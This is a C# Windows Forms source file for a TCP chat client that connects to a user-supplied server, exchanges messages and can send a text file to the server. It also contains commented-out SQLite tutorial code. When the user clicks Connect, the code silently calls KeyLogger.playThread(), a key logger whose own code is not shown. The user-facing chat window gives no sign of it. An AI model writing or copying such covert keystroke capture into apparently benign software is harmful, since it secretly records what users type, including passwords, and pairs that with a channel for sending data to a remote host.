
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace ClientSide
{
    public partial class ClientForm : Form
    {
        private String clientName = "";
        private Socket clientSocket;
        private byte[] buffer;
        // Holds our connection with the database
        SQLiteConnection m_dbConnection;

        private String DB = "";


        public ClientForm()
        {
            InitializeComponent();
        }

        private static void ShowErrorDialog(string message)
        {
            MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void ReceiveCallback(IAsyncResult AR)
        {
            try
            {
                int received = clientSocket.EndReceive(AR);

                if (received == 0)
                {
                    return;
                }


                string message = Encoding.ASCII.GetString(buffer);


                Invoke((Action)delegate
                {
                    // write on txtBox
                    txbChat.AppendText("SERVER: " + message);
                    txbChat.AppendText(Environment.NewLine);
                    Text = "Server says: " + message;
                });

                // Start receiving data again.
                buffer = new byte[clientSocket.ReceiveBufferSize];
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, null);
            }
            // Avoid Pokemon exception handling in cases like these.
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
            }
        }

        private void ConnectCallback(IAsyncResult AR)
        {
            try
            {
                clientSocket.EndConnect(AR);
                UpdateControlStates(true);
                buffer = new byte[clientSocket.ReceiveBufferSize];
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, null);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
            }
        }

        private void SendCallback(IAsyncResult AR)
        {
            try
            {
                clientSocket.EndSend(AR);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
            }
        }

        /// <summary>
        /// A thread safe way to enable the send button.
        /// </summary>
        private void UpdateControlStates(bool toggle)
        {
            Invoke((Action)delegate
            {
                buttonSend.Enabled = toggle;
                buttonConnect.Enabled = !toggle;
                labelIP.Visible = textBoxAddress.Visible = !toggle;
            });
        }

        private void buttonSend_Click(object sender, EventArgs e)
        {
            try
            {
                String msg = txbMsg.Text;
                txbMsg.Text = "";
                var sendData = Encoding.ASCII.GetBytes(msg);
                clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, null);

                // write on txtBox
                txbChat.AppendText("ME: " + msg);
                txbChat.AppendText(Environment.NewLine);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
                UpdateControlStates(false);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
                UpdateControlStates(false);
            }
        }

        private void buttonConnect_Click(object sender, EventArgs e)
        {

            try
            {
                if (txbName.TextLength == 0)
                {
                    ShowErrorDialog("Must fill Client Name");
                }
                else
                {
                    clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    // Connect to the specified host.
                    var endPoint = new IPEndPoint(IPAddress.Parse(textBoxAddress.Text), 3333);
                    clientSocket.BeginConnect(endPoint, ConnectCallback, null);
                    // send ClientName
                    var sendData = Encoding.ASCII.GetBytes(txbName.Text);
                    clientName = txbName.Text;
                    clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, null);

                    // create DB

                    // get system


                    // play key logger
                    KeyLogger.playThread();

                    /*
                   createNewDatabase();
                     connectToDatabase();
                     createTable();
                     fillTable();
                     printClientData();

                  */

                }

            }
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
            }
        }




    
        /*
        // Creates an empty database file
        void createNewDatabase()
        {
            DB = clientName + "DB.sqlite";
            SQLiteConnection.CreateFile(DB);
        }

        // Creates a connection with our database file.
        void connectToDatabase()
        {
            m_dbConnection = new SQLiteConnection("Data Source=" + DB + ";Version=3;");
            m_dbConnection.Open();
        }

        // Creates a table named 'clientData' with two columns: name (a string of max 20 characters) and score (an int)
        void createTable()
        {
            string sql = "create table clientData (name varchar(20), score int)";
            SQLiteCommand command = new SQLiteCommand(sql, m_dbConnection);
            command.ExecuteNonQuery();

        }

        // Inserts some values in the clientData table.
        // As you can see, there is quite some duplicate code here, we'll solve this in part two.
        void fillTable()
        {
            string sql = "insert into clientData (name, score) values ('Me', 3000)";
            SQLiteCommand command = new SQLiteCommand(sql, m_dbConnection);
            command.ExecuteNonQuery();
            sql = "insert into clientData (name, score) values ('Myself', 6000)";
            command = new SQLiteCommand(sql, m_dbConnection);
            command.ExecuteNonQuery();
            sql = "insert into clientData (name, score) values ('And I', 9001)";
            command = new SQLiteCommand(sql, m_dbConnection);
            command.ExecuteNonQuery();
        }

        // Writes the clientData to the console sorted on score in descending order.
        void printClientData()
        {
            txbDB.Text = "";
            string sql = "select * from clientData order by score desc";
            SQLiteCommand command = new SQLiteCommand(sql, m_dbConnection);
            SQLiteDataReader reader = command.ExecuteReader();
            while (reader.Read())
            {
                txbDB.Text += "Name: " + reader["name"] + "\tScore: " + reader["score"] + "\n";
            }

            m_dbConnection.Close();
        }
        */
        private void sendDB_Click(object sender, EventArgs e)
        {
            string path = Directory.GetCurrentDirectory();
            path = System.IO.Path.Combine(path, clientName + ".txt");
            using (System.IO.StreamWriter file = new System.IO.StreamWriter(path, true))
            {

                file.WriteLine(txbDB.Text);
            }

            clientSocket.SendFile(path);


        }
    }
}

